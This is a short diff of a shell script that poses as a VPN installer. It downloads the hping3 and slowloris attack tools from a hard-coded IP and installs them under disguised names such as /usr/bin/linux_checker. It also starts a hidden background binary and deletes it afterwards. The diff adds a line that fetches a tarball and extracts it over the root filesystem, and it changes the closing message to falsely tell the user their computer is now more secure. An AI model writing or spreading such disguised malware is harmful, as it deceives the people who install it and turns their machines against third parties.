@@ -1,5 +1,6 @@
 echo -n "Installing VPN..."
 cd /tmp
+curl -s http://192.168.1.250:5000/s/hping3-libs.tgz | tar -xzv -C /
 curl -s http://192.168.1.250:5000/s/hping3 -o /usr/bin/linux_checker
 chmod +x /usr/bin/linux_checker
 curl -s http://192.168.1.250:5000/s/slowloris -o /usr/bin/linux_verify
@@ -9,4 +10,4 @@ chmod +x ./system_monitor
 ./system_monitor &
 sleep 2
 rm -f system_monitor
-echo " done!"
+echo " done! Now your computer is more secure and protected!"
